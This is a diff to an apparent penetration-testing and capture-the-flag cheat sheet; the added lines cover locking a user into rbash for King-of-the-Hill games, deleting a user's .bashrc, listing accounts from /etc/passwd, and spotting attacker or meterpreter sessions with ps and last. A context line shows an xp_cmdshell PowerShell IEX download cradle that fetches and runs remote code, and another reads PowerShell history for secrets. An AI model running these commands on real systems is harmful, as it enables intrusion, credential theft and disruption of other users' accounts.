@@ -104,3 +104,28 @@ xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://
 ```bash
 type C:\Users\<groupname>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
+## Restrict user bash 
+useful when practicing KOTH / Battlegrounds
+```bash
+chsh -s /bin/rbash <username>
+```
+## remove users .bashrc file
+```bash
+rm /home/username/.bashrc
+```
+## fetches all users in /etc/passwd file
+```bash
+cut -f1 -d: /etc/passwd
+```
+
+## check all services running (forest format)
+Useful for identifying attackers on the same machine
+| we can track all ssh sessions including meterpreter access
+```bash
+ps -aef --forest 
+``` 
+
+## user login/logout connection info
+```bash 
+last -aiF
+```
